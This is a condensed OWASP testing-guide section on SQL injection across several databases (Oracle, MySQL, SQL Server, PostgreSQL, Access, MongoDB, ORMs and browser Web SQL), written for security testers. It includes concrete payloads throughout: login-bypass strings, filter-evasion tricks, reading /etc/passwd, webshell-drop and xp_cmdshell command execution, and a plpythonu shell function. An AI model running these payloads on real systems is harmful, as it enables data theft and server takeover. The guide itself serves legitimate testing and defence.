# WSTG INPV — SQL Injection

OWASP WSTG v4.2. Input Validation subset. Test WSTG-INPV-05 (generic + DBMS-specific: Oracle, MySQL, SQL Server, PostgreSQL, MS Access, NoSQL, ORM, client-side).

## Table of Contents

- [INPV-05 SQL Injection](#wstg-inpv-05)
  - [Generic](#generic)
  - [Oracle](#oracle)
  - [MySQL](#mysql)
  - [SQL Server](#sql-server)
  - [PostgreSQL](#postgresql)
  - [MS Access](#ms-access)
  - [NoSQL (MongoDB)](#nosql-mongodb)
  - [ORM Injection](#orm-injection)
  - [Client-side (Web SQL)](#client-side-web-sql)

---

## WSTG-INPV-05

**Testing for SQL Injection**

Goal: find input used unsanitized inside a SQL query, and assess how far it can be exploited — from reading arbitrary data to full DB/OS compromise.

### Generic

SQL injection classes:

| Class | Mechanism |
|---|---|
| In-band | data returned directly on the same response channel used to inject |
| Out-of-band | data exfiltrated via a different channel (DNS/HTTP callback, email) |
| Inferential / Blind | no data returned directly — inferred from true/false behavior or timing |

Core exploitation techniques (often combined): **Union** (join a crafted query onto a vulnerable `SELECT`), **Boolean** (infer via true/false conditions), **Error-based** (force a DB error that leaks data), **Out-of-band** (DB-initiated callback), **Time delay** (`SLEEP`/`WAITFOR` as a covert signal channel).

**Detection**: enumerate every input (URL params, POST body, hidden fields, headers, cookies) and probe each independently with `'`, `;`, comment delimiters (`--`, `/* */`), `AND`/`OR`, or a string where a number is expected:
```
Microsoft OLE DB Provider for ODBC Drivers error '80040e14'
Unclosed quotation mark before the character string ''.
```
No visible error doesn't mean not-vulnerable — fall back to blind techniques, and vary one input at a time.

**Classic auth-bypass**:
```
$username = 1' or '1' = '1
$password = 1' or '1' = '1
→ SELECT * FROM Users WHERE Username='1' OR '1' = '1' AND Password='1' OR '1' = '1'
```
Parenthesized/hashed queries need matching close-parens plus a comment to drop the rest:
```
$username = 1' or '1' = '1'))/*
```
If the app requires exactly one row returned, append `LIMIT 1`.

**UNION technique** — find column count via `ORDER BY N--` (binary search until it errors), then column types via `UNION SELECT 1,NULL,NULL--` (NULL-fill until types align), then extract:
```
http://example.com/product.php?id=1 UNION ALL SELECT creditCardNumber,1,1 FROM CreditCardTable
```

**Boolean blind** — extract data character-by-character via `ASCII(SUBSTRING(...))` comparisons, using a known-false baseline (`'1'='2'`) to distinguish signal from noise, and `LENGTH(...)` to detect the end of string.

**Error-based** — force a function to fail with attacker data embedded in the error text (DBMS-specific, see below).

**Out-of-band** — trigger a DB-initiated network call carrying exfiltrated data (DBMS-specific, e.g. Oracle `UTL_HTTP`).

**Time delay** — `AND IF(version() LIKE '5%', SLEEP(10), 'false')` — infer truth from response latency; no error/output needed.

**Stacked queries via injected stored procedure**: a stored proc that concatenates unsanitized input into dynamic SQL is exploitable the same way as inline SQL — e.g. `user_login` built as `'... where username = ' + @username` lets `anyusername or 1=1'` bypass the check entirely.

**Signature/WAF evasion**:

| Technique | Example |
|---|---|
| Whitespace variation | `or 'a'='a'` → newline/tab between tokens |
| Null bytes | `%00' UNION SELECT password FROM Users--` |
| Inline comments | `'/**/UNION/**/SELECT/**/password/**/FROM/**/Users--` |
| URL encoding | `%27%20UNION%20SELECT...` |
| Char encoding | `UNION SELECT password FROM Users WHERE name=char(114,111,111,116)--` |
| String concatenation | `EXEC('SEL' + 'ECT 1')` |
| Hex encoding | `WHERE name = unhex('726F6F74')` |
| Declared variable | `declare @v nvarchar(80); set @v = N'UNI'+N'ON SELECT'...; EXEC(@v)` |
| Alt `1=1` forms | `'SQLi'='SQL'+'i'`, `'SQLi' > 'S'`, `2 between 3 and 1`, `1 \|\| 1=1` |

Tools: sqlmap, sqlbftools, MySqloit, wfuzz/FuzzDb payload lists.

Remediation: parameterized queries/prepared statements (SQL Injection Prevention Cheat Sheet), DB hardening (Database Security Cheat Sheet), generic Input Validation Cheat Sheet.

---

### Oracle

Web PL/SQL apps run through the **PL/SQL Gateway** (mod_plsql, older Web Listener, XDB) — a proxy that wraps requested package/procedure calls in anonymous PL/SQL and executes them directly on the DB server. No firewall stops an exploited Gateway from reaching the DB.

Recognizable URLs: `/pls/<DAD>/<schema>.<package>.<procedure>` or `/pls/xyz`, `/xyz/owa`, `/xyz/plsql`. Common default DADs: `SIMPLEDAD`, `HTMLDB`, `ORASSO`, `PORTAL`, `TEST`.

**Detect the Gateway**:
- Server header contains `mod_plsql`, `Oracle-Application-Server`, `Oracle_Web_Listener`, etc.
- **NULL test**: `/pls/dad/null` → 200 OK, `/pls/dad/nosuchproc` → 404, confirms the Gateway.
- **Known package**: `/pls/dad/owa_util.signature` → banner text confirms it (403 on patched systems).

**Direct package access** (older/unpatched Gateways): `OWA_UTIL.CELLSPRINT?P_THEQUERY=SELECT+USERNAME+FROM+ALL_USERS` runs arbitrary SQL; `HTP.PRINT?CBUF=<script>...` is stored/reflected XSS via the Gateway itself.

**Exclusion-list bypass** (patched against direct `SYS.*`/`DBMS_*`/`HTP.*`/`OWA*` access) — historical bypasses: prefix with encoded whitespace (`%0A`/`%20`/`%09`), a PL/SQL label (`<<LBL>>SYS...`), double-quoting the schema name, charset-confusable bytes (`%FF`, `%AF` → uppercase Y), a leading backslash (`%5C`), or (most involved) abusing a parameterless allowed procedure (e.g. `orasso.home`) by closing its bind-variable brackets and injecting `execute immediate :1` via the query string — e.g.:
```
/pls/dad/orasso.home?);execute%20immediate%20:1;--=select%201%20from%20dual
```

**Custom PL/SQL apps** (black-box, no source): probe each param with a single quote; a 404/error vs. a working request with the quote neutralized via concatenation (`DICK'||'ENS`) confirms injection.

Tools: Orascan, NGS SQuirreL.

Refs: *Hackproofing Oracle Application Server*; *Oracle PL/SQL Injection*.

---

### MySQL

Feature availability by version: `UNION` (4.0+), subqueries (4.1+), stored procs/functions/`INFORMATION_SCHEMA` (5.0+), triggers (5.0.2+). Pre-4.0: Boolean/time-blind only.

**Quote-bypass**: if `'` is escaped, use `password LIKE 0x4125` (hex) or `password LIKE CHAR(65,37)` instead of a quoted literal.

**No stacked queries** via most connectors — `1; UPDATE ...--` fails; unlike SQL Server, you can't chain heterogeneous statements in one shot.

**Fingerprint**: MySQL-only comment syntax `/*! ... */` is executed by MySQL, ignored as a comment elsewhere — `1 /*! and 1=0 */` confirms MySQL if present. Version: `@@version`, `VERSION()`, or versioned comment `/*!40110 and 1=0*/`.

**Info gathering**:
```
UNION SELECT @@version        -- version
UNION SELECT USER()           -- connected user
UNION SELECT DATABASE()       -- current DB
```
`INFORMATION_SCHEMA` (5.0+) exposes `SCHEMATA`, `TABLES`, `COLUMNS`, `ROUTINES`, `TRIGGERS`, `USER_PRIVILEGES`, etc. — enumerate via standard UNION/blind technique.

**File read/write** (needs `FILE` privilege, unescaped quotes):
```sql
SELECT * FROM table INTO OUTFILE '/tmp/file'
SELECT load_file('/etc/passwd')
```
Writing a web-executable file into the docroot via `INTO OUTFILE` is a common webshell-drop pattern.

**Blind**: `LENGTH(str)`, `SUBSTRING(str, offset, n)`, and `BENCHMARK(n, expr)` / `SLEEP(n)` (5.0.x+) for timing attacks.

Tools: sqlmap, sqlbftools, MySqloit.

Refs: Chris Anley, *Hackproofing MySQL*.

---

### SQL Server

Useful operators/procs: `--` comment, `;` statement separator (supports **stacked queries**, unlike MySQL), `xp_cmdshell` (OS command exec, sysadmin-only, disabled by default since 2005), `xp_regread`/`xp_regwrite`, `sp_makewebtask` (deprecated), `xp_sendmail`.

**OS command execution**:
```sql
exec master.dbo.xp_cmdshell 'dir c:\inetpub > c:\inetpub\wwwroot\test.txt'--
```
If `xp_cmdshell` was dropped, re-add via `sp_addextendedproc`, or (2005+) re-enable via `sp_configure 'xp_cmdshell', 1`.

**Error-based info leak** via type coercion — forces the target value into an error message:
```
?boardID=2&itemnum=1 AND 1=CONVERT(int, db_name())
?boardID=2&itemnum=1 AND 1=CONVERT(int, @@VERSION)
```

**Entry points**: GET/POST params, `Referer`, `User-Agent`, cookies — any of these can carry a payload if reflected into a dynamic query, e.g. `User-Agent: x', 'ip'); [SQL]--`.

**Port scanning via `OPENROWSET`** (2000 default-on, 2005 default-off): connect to `host:port` and infer open/closed from the error message or response latency.

**Sysadmin password brute force**: loop `OPENROWSET` connections with candidate `sa` passwords plus a `waitfor delay` on success — timing reveals a correct guess. Once obtained: use `OPENROWSET` directly, or `sp_addsrvrolemember` to self-promote.

**Blind/timing**: `waitfor delay '0:0:5'` gated on a condition; if `waitfor` is filtered, substitute any CPU-heavy loop. Extract data bit-by-bit via `ascii(substring(@s,@byte,1)) & power(2,@bit)`.

**Payload delivery**: FTP-script or `debug.exe`-script techniques to drop an executable (e.g. netcat) via chained `xp_cmdshell` calls — largely superseded by automated tools (Bobcat, Sqlninja).

Tools: sqlmap, Bobcat, Sqlninja.

Refs: David Litchfield, *Data-mining with SQL Injection and Inference*; Chris Anley, *(more) Advanced SQL Injection*; Cesar Cerrudo, *Manipulating Microsoft SQL Server Using SQL Injection*.

---

### PostgreSQL

Supports stacked queries via `;` (through the PHP connector), `--` comments, `LIMIT`/`OFFSET`.

**Fingerprint**: `::` cast operator (`1::int=1`) is Postgres-specific; `version()` returns the full banner including OS.

**Blind**: `LENGTH(str)`, `SUBSTR(str,i,n)`, quote-free strings via `CHR(n)||CHR(n)...`, and `pg_sleep(n)` (8.2+) for timing — or a custom `libc`-backed `pg_sleep` on older versions.

**Info**: `SELECT user|current_user|session_user|getpgusername()`; `SELECT current_database()`.

**File read**: `COPY table(col) FROM '/path'` (writes file contents into a table you then extract via UNION) or `pg_read_file('name',0,n)` (8.1+). **File write**: `COPY table(col) TO '/path'`.

**Command execution**: pre-8.1, a `libc`-linked `system()` function plus a `COPY`-based stdout-capture trick; or install untrusted procedural languages (`plpythonu`, `plperlu`) and define a proxy-shell function:
```sql
CREATE FUNCTION proxyshell(text) RETURNS text AS 'import os;return os.popen(args[0]).read()' LANGUAGE plpythonu;
SELECT proxyshell('whoami');
```

Refs: PostgreSQL official docs; sqlmap.

---

### MS Access

**Fingerprint** via error text: `Microsoft JET Database Engine`, or `Microsoft Office Access Database Engine`.

No comment chars, no stacked queries, no `LIMIT`, no `SLEEP`/`BENCHMARK`. Workarounds:

| Missing feature | Workaround |
|---|---|
| Query truncation | null byte `%00` (or `0x16`/`%16` if `%00` gets stripped at the web tier) |
| Row limiting | `TOP` / `LAST` instead of `LIMIT` |
| String concat | `&` (`%26`) or `+` (`%2b`) |

Useful functions: `ASC`, `CHR`, `LEN`, `IIF(cond,a,b)`, `MID(str,start,len)`, `TOP n`, `LAST`.

**Column enumeration** via error-based iteration: `' GROUP BY Id%00`, reading the next unmatched column name out of each successive error.

**Schema discovery**: system tables `MSysObjects`, `MSysACEs`, `MSysAccessXML` (often locked down by default) — or brute force with a wordlist. A leaked `.mdb` path inside the webroot can be downloaded directly.

**Blind** (no shell/file access available at all in modern versions): nested `IIF`/`MID`/`TOP`/`LAST` to extract one character at a time, distinguishing true/false via a type-coercion error (numeric column compared to a string) vs. a normal 200:
```
id=IIF((SELECT MID(LAST(username),1,1) FROM (SELECT TOP 10 username FROM users))='a',0,'no')
```

Refs: Brett Moore, *Access SQL Injection* / *Access Through Access*.

---

### NoSQL (MongoDB)

NoSQL injection targets API-specific syntax (JSON/BSON/XML/LINQ) rather than SQL — HTML-focused sanitizers (`< > & ;`) won't catch it, since the dangerous characters differ (`/ { } :`). Examples below are MongoDB-specific; other NoSQL stores need their own syntax.

MongoDB's `$where` accepts raw JavaScript, evaluated server-side:
```js
db.myCollection.find({ active: true, $where: function() { return obj.credits - obj.debits < $userInput; } });
```
Unsanitized `$userInput` here allows **arbitrary JS execution**, not just data manipulation — e.g. a busy-loop payload can pin the DB at 100% CPU. Special chars that trigger a DB error if unsanitized: `' " \ ; { }`.

Even with sanitized/parameterized input, `$where` is itself a reserved operator name that's also a legal PHP variable — HTTP Parameter Pollution can inject a `$where` PHP variable that overrides the intended query operator (PHP's Mongo driver docs explicitly warn to single-quote operator keys for this reason).

Refs: Bryan Sullivan, *Server-Side JavaScript Injection*, *NoSQL, But Even Less Security*; injection payload wordlists (PayloadsAllTheThings).

---

### ORM Injection

Same exploitation model as SQL injection, but the vulnerable query is generated by an ORM layer rather than written directly.

**Weak implementation** — string-concatenated HQL/SQL instead of positional/named parameters is exploitable identically to raw SQL:
```java
session.createQuery("from Orders as orders where orders.id = " + currentOrder.getId()).list();
```
vs. the safe form using `?` positional binding.

**Vulnerable ORM library itself** — the ORM's parser can have its own injection bugs independent of app code (e.g. Sequelize npm package 2019, Hibernate bypasses per RIPS Tech research, Laravel Query Builder 2019). DBMS-specific bypass payloads researchers have found in ORM parsers:

| DBMS | Payload |
|---|---|
| MySQL | `abc\' INTO OUTFILE --` |
| PostgreSQL | `` $$='$$=chr(61)`` |
| Oracle | `NVL(TO_CHAR(DBMS_XMLGEN.getxml('select 1 where 1337>1')),'1')!='1'` |
| MS SQL | `1<LEN((select top 1 name from users))` |

How to test: identify the ORM/version in use (info gathering), check for known CVEs, and try normal SQL injection against exposed query-building methods — a naive ORM often makes no difference.

Refs: *New Methods for Exploiting ORM Injections in Java Applications* (HITB16); *Fixing SQL Injection: ORM is not enough*.

---

### Client-side (Web SQL)

Applies to apps using the (deprecated) **Web SQL Database** API: `openDatabase()`, `transaction()`, `executeSql()` — SQLite syntax, entirely client-side.

Identify usage by grepping client JS for those three calls. If a query concatenates unsanitized input (e.g. a URL fragment) instead of using `?` placeholders:
```js
transaction.executeSql('SELECT * FROM users WHERE user = ' + userId);
```
an attacker controlling `userId` (e.g. via `location.hash`) injects `15 OR 1=1` to dump all rows. Same payload set as generic SQL injection ([Generic](#generic)) applies once you have write access to the input.

Remediation: same as generic SQL injection — parameterize, never concatenate.

Refs: W3C Web SQL Database; PortSwigger, *Client-Side SQL Injection*.
